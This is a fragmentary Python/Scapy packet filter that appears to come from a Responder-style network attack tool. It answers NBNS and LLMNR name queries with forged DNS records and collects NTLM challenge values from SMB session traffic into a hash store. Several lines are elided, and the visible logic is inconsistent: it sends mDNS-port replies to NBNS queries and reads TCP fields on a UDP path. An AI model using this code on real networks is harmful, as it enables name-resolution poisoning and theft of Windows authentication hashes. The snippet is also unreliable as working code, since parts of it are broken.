...
def NBNSfilter(packet):
    response = None
    if IP in packet and UDP in packet and NBNSHeader in packet and NBNSQueryRequest in packet:
        packet.show()
        ...
        response = IP(dst=packet[IP].src) / UDP(sport=5353, dport=5353) / DNS(qd=packet[DNSQR],
                                                                              an=DNSRR(rrname=packet[DNSQR].qname,
                                                                                       type=1, rdata=ips))
        response.show()
    elif IP in packet and UDP in packet and LLMNRQuery in packet and packet[DNSQR].qtype == 1:
        packet.show()
        ...
        if SPNEGO_negToken in buffer:
            ...
            if type(value) == NTLM_CHALLENGE:
                ...
                hashes[
                    packet[IP].dst + ':A' + str(packet[TCP].seq + len(packet[TCP]) - 20) + ':S' + str(packet[TCP].ack)] = {
                    'ServerChallenge': value.hex()}
                print('hashes:' + str(hashes))
    elif IP in packet and TCP in packet and SMB2_Session_Setup_Request in packet:
        print(packet)
        packet.show()
